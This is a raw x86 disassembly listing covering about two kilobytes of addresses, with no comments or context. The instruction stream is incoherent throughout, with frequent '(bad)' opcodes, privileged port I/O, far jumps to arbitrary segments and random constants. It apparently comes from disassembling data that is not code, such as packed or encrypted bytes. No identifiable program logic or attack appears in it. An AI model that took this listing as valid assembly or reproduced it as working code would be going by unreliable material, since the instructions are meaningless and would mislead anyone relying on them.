  421d11:	ins    DWORD PTR es:[edi],dx
  421d12:	pop    edx
  421d13:	jl     0x421caf
  421d15:	je     0x421cc4
  421d17:	add    DWORD PTR [ebx+eiz*8+0x12],esi
  421d1b:	or     eax,0xccb3b18a
  421d20:	cld    
  421d21:	jmp    0xda93:0x413cf255
  421d28:	push   edi
  421d29:	adc    DWORD PTR [ecx+0x78793733],edi
  421d2f:	xor    eax,0x75654fe4
  421d34:	repz mov ah,dh
  421d37:	cmp    ebx,DWORD PTR [esp+edi*4+0x10896401]
  421d3e:	push   esp
  421d3f:	int    0x85
  421d41:	mov    eax,0x9e472ef8
  421d46:	out    0x50,al
  421d48:	adc    ch,BYTE PTR [edi-0x14]
  421d4b:	aaa    
  421d4c:	xchg   esp,eax
  421d4d:	xbegin 0xa46a2cf1
  421d53:	retf   0xf594
  421d56:	cs div DWORD PTR cs:[ebx+0xb]
  421d5b:	in     eax,0x9b
  421d5d:	ja     0x421d25
  421d5f:	push   ebp
  421d60:	xor    dl,BYTE PTR [ecx]
  421d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d63:	std    
  421d64:	in     al,dx
  421d65:	ss sti 
  421d67:	sbb    al,0x55
  421d69:	push   edi
  421d6a:	les    ecx,FWORD PTR [ecx]
  421d6c:	arpl   WORD PTR [ecx+0x265659da],bp
  421d72:	repnz adc BYTE PTR [edi+0x7ed15c7f],bh
  421d79:	xor    BYTE PTR [ebx+0x5885b2fe],ah
  421d7f:	xor    ecx,edi
  421d81:	xchg   esp,eax
  421d82:	mov    dl,0xb8
  421d84:	push   esp
  421d85:	sar    BYTE PTR [esi],0xfd
  421d88:	dec    edx
  421d8a:	cmp    eax,0x89c9592c
  421d8f:	add    DWORD PTR [ebp+0x620b5d19],edx
  421d95:	imul   esi,DWORD PTR [ebx-0x3e],0x41
  421d99:	stc    
  421d9a:	mov    ebx,0x86874567
  421d9f:	in     eax,0xc9
  421da1:	in     al,0x2c
  421da3:	ja     0x421d3c
  421da5:	(bad)  
  421da6:	pop    ecx
  421da7:	sti    
  421da8:	pop    edi
  421da9:	mov    cl,0x97
  421dab:	pop    ds
  421dac:	xor    bh,BYTE PTR [eax]
  421dae:	jno    0x421d30
  421db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421db1:	in     eax,0xa2
  421db3:	jns    0x421daa
  421db5:	mov    dl,0x5b
  421db7:	not    BYTE PTR [ebp+0x1e]
  421dba:	mov    cl,0x49
  421dbc:	pop    ebx
  421dbd:	sub    al,0xe5
  421dbf:	repz div BYTE PTR [edi+0x1641f9b4]
  421dc6:	daa    
  421dc7:	lods   eax,DWORD PTR ds:[esi]
  421dc8:	xor    bl,BYTE PTR [ebx-0x70]
  421dcb:	jg     0x421e13
  421dcd:	adc    ecx,DWORD PTR [edx]
  421dcf:	dec    eax
  421dd0:	retf   
  421dd1:	lods   al,BYTE PTR ds:[esi]
  421dd2:	jl     0x421d83
  421dd4:	ins    BYTE PTR es:[edi],dx
  421dd5:	enter  0x8c78,0xe4
  421dd9:	jnp    0x421e23
  421ddb:	dec    ecx
  421ddc:	xchg   ebx,eax
  421ddd:	mov    BYTE PTR [edx-0x1065d74],bh
  421de3:	dec    edi
  421de4:	je     0x421e39
  421de6:	retf   0x5d76
  421de9:	mov    edi,0xcd138af
  421dee:	inc    esp
  421def:	add    eax,0xd3b785f5
  421df4:	inc    edx
  421df5:	jns    0x421d99
  421df7:	(bad)  
  421df8:	cmc    
  421df9:	push   0xffffff83
  421dfb:	jp     0x421e3d
  421dfd:	xchg   edx,eax
  421dfe:	ds mov ebp,0x3e1a6211
  421e04:	loopne 0x421e76
  421e06:	retf   0x8af8
  421e09:	xchg   BYTE PTR [ecx+0x35876a1f],ah
  421e0f:	cmc    
  421e10:	mov    edx,0x3adda20d
  421e15:	add    bh,dh
  421e17:	xchg   ebx,eax
  421e18:	in     al,dx
  421e19:	cmp    BYTE PTR [eax+eiz*1],ah
  421e1c:	push   eax
  421e1d:	ds xchg ebp,eax
  421e1f:	aam    0x27
  421e21:	dec    edi
  421e22:	sub    BYTE PTR [edx],al
  421e24:	int3   
  421e25:	mov    bl,0x18
  421e27:	pop    esp
  421e28:	cmp    WORD PTR [esi],dx
  421e2b:	cmc    
  421e2c:	popa   
  421e2d:	fild   QWORD PTR [eax]
  421e2f:	and    eax,0x66dbcb9f
  421e34:	stc    
  421e35:	mov    edi,0xb382cbe1
  421e3a:	cmp    BYTE PTR [ecx+0x39],dh
  421e3d:	mul    BYTE PTR [esi]
  421e3f:	dec    ebp
  421e40:	pop    ebp
  421e41:	pop    esp
  421e42:	mov    ds:0xb43881e8,al
  421e47:	add    DWORD PTR [ecx],esp
  421e49:	jmp    0x1e82:0x4b9cd281
  421e50:	lods   eax,DWORD PTR ds:[esi]
  421e51:	pop    ds
  421e52:	pusha  
  421e53:	push   cs
  421e54:	(bad)  
  421e55:	jl     0x421e57
  421e57:	xchg   esi,eax
  421e58:	out    dx,al
  421e59:	xor    bl,BYTE PTR [ecx+edx*8+0x365d44d8]
  421e60:	(bad)  
  421e61:	(bad)  
  421e62:	daa    
  421e63:	xor    DWORD PTR ds:0xf3d44542,edx
  421e69:	xchg   ecx,eax
  421e6a:	fcomp  QWORD PTR [esi-0x21]
  421e6d:	dec    edx
  421e6e:	inc    eax
  421e6f:	out    0xe2,al
  421e71:	mov    bh,0x86
  421e73:	mov    bh,0x6f
  421e75:	mov    al,BYTE PTR [eax]
  421e77:	jl     0x421ebd
  421e79:	xchg   edi,eax
  421e7a:	sub    dl,0xe7
  421e7d:	dec    ecx
  421e7e:	(bad)  
  421e7f:	pop    ebp
  421e80:	inc    edi
  421e81:	add    edx,DWORD PTR [eax+0x49ce43ff]
  421e87:	jmp    0xc2f25a13
  421e8c:	xchg   edx,eax
  421e8d:	jmp    0x9e22:0x2673852a
  421e94:	outs   dx,DWORD PTR ds:[esi]
  421e95:	stos   BYTE PTR es:[edi],al
  421e96:	add    BYTE PTR [edi+edx*4+0x69720f05],bh
  421e9d:	xchg   ebx,eax
  421e9e:	call   0x65cc:0x49b5d7ea
  421ea5:	fldenv [ecx]
  421ea7:	cmp    eax,0x550b33d0
  421eac:	xor    eax,0xface935a
  421eb1:	pop    ebx
  421eb2:	fwait
  421eb3:	rol    bl,0xfc
  421eb6:	ret    
  421eb7:	test   al,0xe8
  421eb9:	xor    DWORD PTR [edx+edx*4+0x2],esi
  421ebd:	mov    ?,si
  421ec0:	or     al,0x86
  421ec2:	(bad)  
  421ec4:	ins    BYTE PTR es:[edi],dx
  421ec5:	nop
  421ec6:	mov    eax,0xf3d8dee6
  421ecb:	dec    esp
  421ecc:	jp     0x421e68
  421ece:	ins    DWORD PTR es:[edi],dx
  421ecf:	aam    0x2b
  421ed1:	call   0xf17266b6
  421ed6:	call   0x8a99f163
  421edb:	jae    0x421eb6
  421edd:	dec    esi
  421ede:	imul   eax,ebp,0xe4a89c56
  421ee4:	and    BYTE PTR [ebp+edx*1-0x76b22999],dh
  421eeb:	xchg   ebx,eax
  421eec:	pop    eax
  421eed:	cmp    al,0x4b
  421eef:	jbe    0x421f0e
  421ef1:	push   0x565ee41
  421ef6:	pop    esp
  421ef7:	mov    eax,0xab936e8d
  421efc:	mov    al,BYTE PTR [ebx+0x56a41434]
  421f02:	mov    ecx,0x3a611e75
  421f07:	xor    al,0x36
  421f09:	in     al,0xc6
  421f0b:	repnz push ds
  421f0d:	dec    esi
  421f0e:	inc    ebx
  421f0f:	xchg   ebp,eax
  421f10:	xchg   esp,eax
  421f11:	dec    esp
  421f12:	push   esi
  421f13:	mov    dh,0xce
  421f15:	inc    esi
  421f16:	push   es
  421f17:	jg     0x421f18
  421f19:	jmp    0x421ef9
  421f1b:	es push 0x43
  421f1e:	loop   0x421f35
  421f20:	popf   
  421f21:	inc    BYTE PTR ds:0x71abc9f8
  421f27:	adc    BYTE PTR [edx],cl
  421f29:	dec    edi
  421f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f2b:	cmc    
  421f2c:	aaa    
  421f2d:	div    BYTE PTR [ebp-0x3d]
  421f30:	retw   0xc1b6
  421f34:	xor    BYTE PTR [ebx-0x76cec04b],al
  421f3a:	outs   dx,DWORD PTR ds:[esi]
  421f3b:	mov    esi,0xd02d3998
  421f40:	inc    esp
  421f41:	int    0x11
  421f43:	and    eax,0xd4f504ac
  421f48:	fimul  WORD PTR [esi-0x214ee7f7]
  421f4e:	sub    al,0x85
  421f50:	add    cl,ch
  421f52:	fidiv  DWORD PTR [ebp-0x36]
  421f55:	sub    bh,al
  421f57:	inc    eax
  421f58:	mov    edx,ecx
  421f5a:	fistp  QWORD PTR [ebx]
  421f5c:	mov    bh,BYTE PTR [ebp-0x30dc9dd1]
  421f62:	enter  0xfd54,0x2f
  421f66:	(bad)  
  421f67:	or     BYTE PTR [ebx+0x7476c65c],bh
  421f6d:	sub    esi,DWORD PTR [edx]
  421f6f:	iret   
  421f70:	cld    
  421f71:	dec    ebp
  421f72:	dec    ebp
  421f73:	xchg   ebx,eax
  421f74:	xchg   ebp,eax
  421f75:	loope  0x421fe1
  421f77:	xchg   ah,ch
  421f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f7a:	ins    DWORD PTR es:[edi],dx
  421f7b:	inc    ecx
  421f7c:	repnz mov ds:0xeb2d4ae5,eax
  421f82:	mov    ebx,edi
  421f84:	ins    BYTE PTR es:[edi],dx
  421f85:	es retf 
  421f87:	and    al,0x11
  421f89:	mov    ah,0xcd
  421f8b:	pop    ds
  421f8c:	jge    0x421f5a
  421f8e:	jnp    0x421f8b
  421f90:	push   ds
  421f91:	xchg   DWORD PTR [esi],edx
  421f93:	mov    BYTE PTR [eax-0x22],al
  421f96:	leave  
  421f97:	xor    eax,0xa59b632d
  421f9c:	sti    
  421f9d:	push   0x6afbaad5
  421fa2:	ret    
  421fa3:	aam    0xdb
  421fa5:	in     eax,0xd3
  421fa7:	std    
  421fa8:	jecxz  0x421f7f
  421faa:	pop    es
  421fab:	push   ebp
  421fac:	jae    0x421f40
  421fae:	sbb    al,0x48
  421fb0:	jbe    0x421f8b
  421fb2:	dec    ebp
  421fb3:	mov    edx,0x4d31286
  421fb8:	jns    0x421fa9
  421fba:	push   ds
  421fbb:	jnp    0x421f6a
  421fbd:	ficom  DWORD PTR [ecx+0x1]
  421fc0:	adc    eax,0xcc46e0ad
  421fc5:	and    ebx,ebx
  421fc7:	(bad)  
  421fc8:	fsubr  QWORD PTR [esi+0x27c868d6]
  421fce:	dec    ebp
  421fcf:	pop    edi
  421fd0:	pop    esp
  421fd1:	loopne 0x421ff1
  421fd3:	enter  0xc2f1,0x22
  421fd7:	lea    ebp,[ebx+0x4f8def67]
  421fdd:	pop    ebx
  421fde:	sti    
  421fdf:	pop    es
  421fe0:	or     cl,bl
  421fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fe3:	cdq    
  421fe4:	mov    ebp,0x30c7693b
  421fe9:	sub    al,0x9a
  421feb:	xchg   esp,eax
  421fec:	sub    ah,BYTE PTR [esi+eiz*8]
  421fef:	add    eax,0xfb7a1880
  421ff4:	mov    gs,WORD PTR [edi]
  421ff6:	popa   
  421ff7:	xchg   esp,eax
  421ff8:	dec    esp
  421ff9:	addr16 or esi,edi
  421ffc:	xchg   esp,eax
  421ffd:	dec    ebp
  421ffe:	xchg   ecx,eax
  421fff:	mov    eax,0x718ceaef
  422004:	fisubr DWORD PTR [ebx+0x7ddcdd69]
  42200a:	sub    bh,ah
  42200c:	loop   0x422017
  42200e:	push   ebp
  42200f:	lods   eax,DWORD PTR ds:[esi]
  422010:	and    ebp,DWORD PTR [eax-0x5aea6917]
  422016:	outs   dx,BYTE PTR ds:[esi]
  422017:	pop    ecx
  422018:	repnz sti 
  42201a:	jecxz  0x422052
  42201c:	sbb    BYTE PTR [edi+0x60],0xee
  422020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422021:	and    BYTE PTR [ebp-0x43e6e62a],ah
  422027:	(bad)  
  422028:	xchg   ebx,eax
  422029:	cmc    
  42202a:	js     0x421fb0
  42202c:	sbb    edx,DWORD PTR [ebx-0x55836fb1]
  422032:	jns    0x42205b
  422034:	jmp    0x3daeb5e1
  422039:	fisub  DWORD PTR [edi+0x6f]
  42203c:	push   edx
  42203d:	jb     0x421fe5
  42203f:	lods   al,BYTE PTR ds:[esi]
  422040:	iret   
  422041:	cmp    dh,BYTE PTR [eax]
  422043:	clc    
  422044:	or     al,0x5a
  422046:	fst    DWORD PTR [edi]
  422048:	and    DWORD PTR [edi],eax
  42204a:	push   edi
  42204b:	inc    ebx
  42204c:	mov    ds:0x59a90fe5,eax
  422051:	popf   
  422052:	push   ds
  422053:	push   ecx
  422054:	call   0x4bdc:0xdaac4371
  42205b:	pop    ecx
  42205c:	sbb    esi,DWORD PTR [edx+eiz*2+0x1f]
  422060:	sahf   
  422061:	push   ecx
  422062:	pop    ss
  422063:	push   es
  422064:	ret    
  422065:	jge    0x4220d0
  422067:	jo     0x42204b
  422069:	xchg   DWORD PTR [edx-0x5c9cc98b],eax
  42206f:	stos   BYTE PTR es:[edi],al
  422070:	mov    ds:0xca19c042,eax
  422075:	jmp    0x422056
  422077:	pop    es
  422078:	popf   
  422079:	dec    esi
  42207a:	mov    eax,0x3d59dcd7
  42207f:	mov    ds:0x6393e1bd,al
  422084:	jnp    0x422041
  422086:	sub    eax,0x35afe929
  42208b:	add    al,0x82
  42208e:	pop    ebp
  42208f:	mov    ds:0x82a55799,eax
  422094:	popa   
  422095:	test   DWORD PTR [esi+ecx*8],0xf5757b5
  42209c:	inc    edi
  42209d:	or     ebx,DWORD PTR [ebx+0x19a16140]
  4220a3:	xor    al,0x8c
  4220a5:	inc    esp
  4220a6:	das    
  4220a7:	aam    0x42
  4220a9:	mov    cl,BYTE PTR [ecx]
  4220ab:	cwde   
  4220ac:	mov    ?,WORD PTR [edx+0x351d8943]
  4220b2:	inc    edx
  4220b3:	and    DWORD PTR fs:[ebx],edi
  4220b6:	sub    edx,DWORD PTR [eax+0x2c9edf49]
  4220bc:	cmp    esi,esi
  4220be:	pop    esi
  4220bf:	dec    ecx
  4220c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220c1:	sub    DWORD PTR [edx],0x14626da6
  4220c7:	sub    esp,DWORD PTR [ecx]
  4220c9:	mov    al,ds:0x20831661
  4220ce:	mov    eax,ds:0x14fc22d9
  4220d3:	or     DWORD PTR [eax-0x658c7e6a],0x4f
  4220da:	mov    ecx,0x56b05652
  4220df:	or     bh,0x8d
  4220e2:	lods   al,BYTE PTR ds:[esi]
  4220e3:	xchg   edx,ebp
  4220e5:	inc    ecx
  4220e6:	stos   BYTE PTR es:[edi],al
  4220e7:	popf   
  4220e8:	ror    BYTE PTR [edi+0x1471b1bb],0x69
  4220ef:	add    al,cl
  4220f1:	ss cs dec ebx
  4220f4:	lods   eax,DWORD PTR ds:[esi]
  4220f5:	imul   esi,DWORD PTR [eax+0x72],0x64
  4220f9:	(bad)  
  4220fa:	rcl    BYTE PTR [eax+ebx*4],0xa8
  4220fe:	dec    edi
  4220ff:	test   al,0x24
  422101:	mov    edi,0xd009b81
  422106:	popf   
  422107:	imul   ecx,DWORD PTR [edx-0x67],0x40f22dc4
  42210e:	sbb    eax,0x3b56eb3
  422113:	pop    edx
  422114:	cmp    ecx,DWORD PTR [edx+edi*1-0x5c]
  422118:	or     bh,0xea
  42211b:	mov    esp,0x8bb516f
  422120:	jle    0x4220d6
  422122:	pop    esp
  422123:	cmp    BYTE PTR [ebx-0x587d635],al
  422129:	pop    edi
  42212a:	cmp    al,0x89
  42212c:	mov    ch,0x78
  42212e:	imul   edi,DWORD PTR [edx+0x70],0xfffffff3
  422132:	(bad)  
  422133:	in     al,0x53
  422135:	jne    0x422177
  422137:	dec    ecx
  422138:	pusha  
  422139:	shl    DWORD PTR [edx],cl
  42213b:	mov    ds,WORD PTR [ecx]
  42213d:	enter  0xcba2,0x5b
  422141:	retf   
  422142:	fst    QWORD PTR [ebx]
  422144:	aad    0x4b
  422146:	gs int3 
  422148:	in     al,dx
  422149:	call   0xc3cc5bc6
  42214e:	sbb    cl,BYTE PTR [ebp-0x2b]
  422151:	push   ebx
  422152:	sti    
  422153:	mov    bl,0xf
  422155:	lea    ebx,[eax]
  422157:	mov    ah,0x76
  422159:	imul   ebp,DWORD PTR [ebx+0x1d],0xed01ff83
  422160:	nop    DWORD PTR [esi+0x69]
  422164:	pop    ebp
  422165:	imul   esp,edi,0x2ab43d45
  42216b:	push   cs
  42216c:	adc    cl,bl
  42216e:	hlt    
  42216f:	mov    ds:0x32dd2d9e,al
  422174:	cmp    eax,0x2f424bc3
  422179:	sbb    esp,ebx
  42217b:	jb     0x422118
  42217d:	icebp  
  42217e:	mov    eax,ds:0xf7f6cc23
  422183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422184:	loope  0x42217b
  422186:	jo     0x422113
  422188:	retf   0x716a
  42218b:	jns    0x4221ac
  42218d:	inc    ecx
  42218e:	enter  0xd11c,0xc4
  422192:	xor    ch,dl
  422194:	jp     0x42215d
  422196:	mov    dh,0xe
  422198:	rcl    DWORD PTR [ebx-0x4f569cfa],1
  42219e:	std    
  42219f:	pop    ebp
  4221a0:	les    ecx,FWORD PTR [edi+0xe]
  4221a3:	(bad)  
  4221a4:	and    eax,0x516f9221
  4221a9:	and    BYTE PTR [edi-0x3ffa193e],0x4
  4221b0:	into   
  4221b1:	mov    esp,0x2a7d44ce
  4221b6:	add    al,0xbb
  4221b8:	add    edi,ebp
  4221ba:	nop
  4221bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221bc:	xchg   ecx,eax
  4221bd:	push   0x13
  4221bf:	cmp    eax,0xb44e491a
  4221c4:	lahf   
  4221c5:	jg     0x42217b
  4221c7:	arpl   bx,ax
  4221c9:	ror    ebp,cl
  4221cb:	dec    eax
  4221cc:	sahf   
  4221cd:	out    0xee,eax
  4221cf:	xor    al,0x82
  4221d1:	jp     0x42218c
  4221d3:	xchg   ebx,eax
  4221d4:	call   0xf1b:0xe1432249
  4221db:	test   al,0x51
  4221dd:	mov    ebx,DWORD PTR [ebx+ebx*2]
  4221e0:	sbb    al,0x45
  4221e2:	mov    edi,0xb04342ce
  4221e7:	test   al,0x88
  4221e9:	mov    ecx,0x1ed64849
  4221ee:	cmp    BYTE PTR [eax-0x2c9f9f9f],cl
  4221f4:	mov    al,ds:0x7b0aec1f
  4221f9:	pop    esi
  4221fa:	and    al,0xf4
  4221fc:	lods   al,BYTE PTR ds:[esi]
  4221fd:	pop    eax
  4221fe:	lahf   
  4221ff:	data16 add ch,BYTE PTR [edi]
  422202:	ja     0x422192
  422204:	cmp    ecx,esp
  422206:	and    eax,0x8c2846ae
  42220b:	mov    dl,0x36
  42220d:	adc    ecx,DWORD PTR [edx]
  42220f:	xor    ebp,0xfea38edb
  422215:	jecxz  0x4221a6
  422217:	or     bl,dh
  422219:	jge    0x4221bc
  42221b:	lock push edi
  42221d:	jne    0x422263
  42221f:	ror    bl,0x87
  422222:	in     al,dx
  422223:	xchg   esp,eax
  422224:	xchg   ebx,eax
  422225:	outs   dx,DWORD PTR ds:[esi]
  422226:	mov    ebp,0x6a883b60
  42222b:	sub    al,0x16
  42222d:	pop    eax
  42222e:	adc    bl,ch
  422230:	pop    eax
  422231:	stos   BYTE PTR es:[edi],al
  422232:	inc    esp
  422233:	xor    eax,0x811ba54c
  422238:	aaa    
  422239:	ret    0x8351
  42223c:	shl    DWORD PTR [ecx+0x65],1
  42223f:	jge    0x42224a
  422241:	adc    al,0xa9
  422243:	dec    esi
  422244:	mov    al,0x31
  422246:	mov    ebx,0xb6e96301
  42224b:	mov    esp,DWORD PTR [edx+0x2a]
  42224e:	js     0x4222a1
  422250:	mov    fs,WORD PTR [esi-0x6e34b69d]
  422256:	dec    DWORD PTR [edx+0x7a21e29f]
  42225c:	push   esi
  42225d:	mov    ebp,0x12d14eb0
  422262:	aas    
  422263:	enter  0x7ec8,0x7
  422267:	scas   al,BYTE PTR es:[edi]
  422268:	mov    al,0x58
  42226a:	xchg   esi,eax
  42226b:	jns    0x422278
  42226d:	in     al,0x0
  42226f:	(bad)  
  422270:	push   ebp
  422271:	ss jae 0x42226c
  422274:	(bad)
  422278:	lahf   
  422279:	sbb    al,0xf7
  42227b:	cli    
  42227c:	xchg   BYTE PTR [eax-0x673776b8],ah
  422282:	push   0xffffff80
  422284:	pushf  
  422285:	enter  0x2bc5,0xe
  422289:	jo     0x422262
  42228b:	mov    ebp,DWORD PTR [edx-0x6023646]
  422291:	loope  0x422293
  422293:	(bad)  
  422294:	aam    0xe9
  422296:	inc    eax
  422297:	jbe    0x422304
  422299:	mov    esi,0x1c83526c
  42229e:	mov    ah,0xb3
  4222a0:	sbb    BYTE PTR [esi],0x98
  4222a3:	push   edx
  4222a4:	test   al,0xfa
  4222a6:	jecxz  0x422281
  4222a8:	pop    ebx
  4222a9:	or     DWORD PTR [ebx-0x48d2cbc1],ecx
  4222af:	shr    BYTE PTR [ebx+0x3b729929],cl
  4222b5:	mov    dl,0x23
  4222b7:	xchg   edx,eax
  4222b8:	lea    ebp,[esi]
  4222ba:	and    ebx,DWORD PTR [eax]
  4222bc:	addr16 push cs
  4222be:	in     eax,0x3e
  4222c0:	enter  0x9b34,0xa8
  4222c4:	jae    0x4222f6
  4222c6:	hlt    
  4222c7:	cli    
  4222c8:	cmp    al,0x1a
  4222ca:	daa    
  4222cb:	ret    0xbd9f
  4222ce:	mov    eax,ds:0x35135d31
  4222d3:	out    dx,al
  4222d4:	jno    0x422294
  4222d6:	sbb    BYTE PTR [ecx],cl
  4222d8:	fs adc al,0xe4
  4222db:	imul   edi,DWORD PTR [esp+ebx*4+0x36],0x2c1def8f
  4222e3:	jnp    0x422355
  4222e5:	popa   
  4222e6:	sub    eax,0x9642a7fe
  4222eb:	xchg   edx,eax
  4222ec:	retf   0xf38b
  4222ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222f0:	xchg   ebp,eax
  4222f1:	mov    bl,BYTE PTR [ebx+ecx*2-0x2814aefd]
  4222f8:	sbb    ah,BYTE PTR [ebx-0x3e]
  4222fb:	dec    ecx
  4222fc:	xchg   ebx,eax
  4222fd:	xor    BYTE PTR [ebx-0x30b5762c],dh
  422303:	aaa    
  422304:	adc    al,dh
  422306:	js     0x4222c8
  422308:	adc    eax,0xc816274f
  42230d:	push   es
  42230e:	dec    edi
  42230f:	test   al,0xdd
  422311:	xchg   ebp,eax
  422312:	gs jmp 0x832d702
  422318:	push   edx
  422319:	or     al,0x64
  42231b:	and    cl,BYTE PTR [edi]
  42231d:	add    eax,0xa5753249
  422322:	jg     0x422332
  422324:	jnp    0x422356
  422326:	and    ah,BYTE PTR [ebx-0x7a]
  422329:	aam    0xe1
  42232b:	outs   dx,DWORD PTR ds:[esi]
  42232c:	ret    
  42232d:	adc    edi,eax
  42232f:	xor    BYTE PTR [ecx+ebx*4+0x1f],ch
  422333:	je     0x422391
  422335:	ficomp DWORD PTR [edi+0x24]
  422338:	repz push eax
  42233a:	rcl    DWORD PTR [ecx-0x52],0xb5
  42233e:	and    bl,0x6e
  422341:	rol    BYTE PTR [esi+0x25be3e07],1
  422347:	(bad)  [edi-0x5a]
  42234a:	test   DWORD PTR [ebp-0xce70e],ecx
  422350:	jne    0x422372
  422352:	popa   
  422353:	or     eax,0x96fc4e88
  422358:	mov    gs,edx
  42235a:	test   al,0xa4
  42235c:	std    
  42235d:	fisub  DWORD PTR [eax-0x91f06c]
  422363:	pusha  
  422364:	(bad)  
  422367:	xchg   edi,eax
  422368:	or     BYTE PTR [eax],bl
  42236a:	sbb    edx,ecx
  42236c:	mov    ds:0xb4bd9719,eax
  422371:	stos   BYTE PTR es:[edi],al
  422372:	es sub eax,0xa812740a
  422378:	mov    cl,0xc6
  42237a:	pop    eax
  42237b:	mov    cl,0x9
  42237d:	jbe    0x42237f
  42237f:	shl    dl,0x3f
  422382:	cmp    dl,cl
  422384:	sub    al,0xa6
  422386:	xchg   DWORD PTR [ecx+ebx*4+0xb],eax
  42238a:	jmp    0xc2d4:0xbdf5c464
  422391:	mov    cl,0xdc
  422393:	lods   eax,DWORD PTR ds:[esi]
  422394:	(bad)  
  422395:	rcl    edx,1
  422397:	arpl   WORD PTR [esi],sp
  422399:	lock jmp 0x6fd2:0x4fca8215
  4223a1:	int3   
  4223a2:	inc    edi
  4223a3:	pop    edi
  4223a4:	out    dx,al
  4223a5:	xor    bl,dh
  4223a7:	ds call 0x4145:0xf58807a7
  4223af:	mov    ecx,DWORD PTR ds:0x581db574
  4223b5:	pop    es
  4223b6:	jle    0x4223e0
  4223b8:	push   ebp
  4223b9:	sbb    BYTE PTR [esi+ecx*4-0x16],cl
  4223bd:	inc    ebx
  4223be:	mov    ebp,0x77d9d5cf
  4223c3:	out    0x31,eax
  4223c5:	(bad)  
  4223c6:	out    dx,al
  4223c7:	sbb    BYTE PTR [eax],cl
  4223c9:	fwait
  4223ca:	adc    al,0xb1
  4223cc:	and    DWORD PTR [ebx-0x41],ebx
  4223cf:	and    eax,0x7c5a55b1
  4223d4:	jne    0x42242e
  4223d6:	frstor [edx]
  4223d8:	or     al,0x3d
  4223da:	aad    0x8a
  4223dc:	pop    esp
  4223dd:	ret    0xbe3d
  4223e0:	push   0xfffffff3
  4223e2:	xchg   edx,eax
  4223e3:	repz (bad) 
  4223e5:	or     eax,0xc12e6ff7
  4223ea:	mov    dh,BYTE PTR [ebp-0x50]
  4223ed:	mov    bh,0xcd
  4223ef:	add    BYTE PTR [ecx-0x750be5bd],dl
  4223f5:	lds    esi,FWORD PTR [esi+0x65]
  4223f8:	mov    eax,0x4abd5f2f
  4223fd:	in     al,0xb7
  4223ff:	dec    eax
  422400:	sti    
  422401:	or     bh,al
  422403:	jmp    0xefe2:0xd697ef84
  42240a:	adc    ah,0x96
  42240d:	fstp   TBYTE PTR [edi+ebx*1+0x404b8909]
  422414:	jae    0x422457
  422416:	int3   
  422417:	jno    0x422416
  422419:	jb     0x42240b
  42241b:	test   eax,0x48424eb9
  422420:	jns    0x422412
  422422:	out    dx,al
  422423:	xchg   edx,eax
  422424:	lahf   
  422425:	jae    0x4223db
  422427:	popf   
  422428:	push   eax
  422429:	movzx  ecx,bl
  42242c:	sar    DWORD PTR [ecx-0x3151247a],0x6f
  422433:	pop    esi
  422434:	add    eax,0xddb863fa
  422439:	pushf  
  42243a:	int3   
  42243b:	push   ds
  42243c:	cdq    
  42243d:	push   ebp
  42243e:	loop   0x42244c
  422440:	push   esp
  422441:	and    ebp,edx
  422443:	call   0x4669:0x956f2901
  42244a:	dec    edx
  42244b:	mov    cs,WORD PTR [edx]
  42244d:	scas   eax,DWORD PTR es:[edi]
  42244e:	pop    ds
  42244f:	mov    ch,0xb7
  422451:	fwait
  422452:	jmp    DWORD PTR [edx+0x1fdbdf7]
  422458:	sbb    al,0xaf
  42245a:	adc    esi,DWORD PTR [edx-0x19]
  42245d:	jmp    0x12d99c98
  422462:	xchg   ebx,eax
  422463:	xchg   ebp,eax
  422464:	push   edi
  422465:	(bad)  
  422466:	fst    QWORD PTR [edx-0x12]
  422469:	pop    es
  42246a:	fcmovne st,st(5)
  42246c:	aad    0xab
  42246e:	sub    DWORD PTR [esp+esi*2],eax
  422471:	jo     0x42243b
  422473:	test   BYTE PTR [edi+ebp*4],ah
  422476:	inc    edi
  422477:	inc    esp
  422478:	mov    esp,esp
  42247a:	(bad)  
  42247c:	int    0x87
  42247e:	mov    ds:0x676bc9df,eax
  422483:	sar    BYTE PTR [ecx+0x1596187d],0xff
  42248a:	sub    al,0xe5
  42248c:	bound  ecx,QWORD PTR [edi+0x4e593bd7]
  422492:	cmp    al,0xec
  422494:	and    edx,edi
  422496:	test   BYTE PTR [edx+0x1afc1d2a],0x5f
  42249d:	sbb    eax,0x859d64e6
  4224a2:	das    
  4224a3:	les    ebp,FWORD PTR [edx-0x6c1b5350]
  4224a9:	adc    dl,cl
  4224ab:	dec    ebx
  4224ac:	pop    ss
  4224ad:	scas   eax,DWORD PTR es:[edi]
  4224ae:	add    eax,0x30f691e7
  4224b3:	push   0x2a
  4224b5:	mov    esi,0xc7a9ed86
  4224ba:	and    esp,0xffffffe3
  4224bd:	mov    ds:0x2d9f1ec8,eax
  4224c2:	js     0x4224ad
  4224c4:	in     eax,dx
  4224c5:	push   ebp
  4224c6:	leave  
  4224c7:	inc    ebx
  4224c8:	pop    eax
  4224c9:	sub    DWORD PTR [esp+edi*2],edx
  4224cc:	or     al,0xd8
  4224ce:	cmp    esp,0x81cc1e70
  4224d4:	mov    bl,0xdb
  4224d6:	rcr    BYTE PTR [edi],cl
  4224d8:	jl     0x4224b7
  4224da:	inc    edx
  4224db:	aam    0x2f
  4224dd:	sahf   
  4224de:	adc    DWORD PTR [eax+0x11027e42],edx
  4224e4:	jae    0x422466
  4224e6:	jb     0x422493
  4224e8:	rol    DWORD PTR [ebp+0x7c],cl
  4224eb:	retf   0x8ab3
  4224ee:	icebp  
  4224ef:	jne    0x4224d6
  4224f1:	and    al,0x2e
  4224f3:	mov    DWORD PTR [edx],edi
  4224f5:	pusha  
  4224f6:	ret    
  4224f7:	jmp    0x5d49:0xf6745feb
  4224fe:	pop    ss
  4224ff:	nop
  422500:	push   ebx
  422501:	cmp    eax,0x10677892
  422506:	mov    ch,0x4d
  422508:	les    ebp,FWORD PTR [edi-0x41851944]
  42250e:	jl     0x422559
  422510:	ins    BYTE PTR es:[edi],dx
  422511:	lods   eax,DWORD PTR ds:[esi]
